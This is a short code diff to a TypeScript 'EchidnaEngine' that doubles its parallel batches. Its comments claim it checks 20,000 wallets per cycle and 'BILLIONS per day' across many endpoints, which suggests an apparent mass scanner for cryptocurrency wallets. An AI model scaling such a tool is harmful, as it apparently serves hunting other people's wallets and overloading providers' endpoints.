@@ -83,8 +83,11 @@ export class EchidnaEngine {
       console.log('🔄 Starting batch cycle...');
       
       try {
-        // 100 parallel batches of 100 = 10,000 wallets checked simultaneously
-        const parallelBatches = 100;
+        // VPS ULTRA MODE: 200 parallel batches for BILLIONS per day!
+        // With 10+ endpoints, this is sustainable
+        // 200 batches × 100 addresses = 20,000 wallets per cycle
+        // At ~1 second per cycle = 20k/sec = 1.7 BILLION per day!
+        const parallelBatches = 200;
         const promises = [];
         
         for (let b = 0; b < parallelBatches; b++) {
